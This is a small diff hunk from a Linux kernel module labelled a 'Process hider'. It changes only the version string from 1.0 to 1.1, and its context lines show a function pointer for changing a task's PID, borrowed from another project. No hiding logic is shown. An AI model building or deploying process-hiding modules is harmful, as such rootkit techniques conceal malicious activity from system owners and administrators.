@@ -13,7 +13,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Jean 'iansus' Marsault");
 MODULE_DESCRIPTION("Process hider");
-MODULE_VERSION("1.0");
+MODULE_VERSION("1.1");
 
 // From https://github.com/gravit0/changepid/blob/master/module/main.c
 static asmlinkage void (*change_pidR)(struct task_struct *task, enum pid_type type, struct pid *pid);
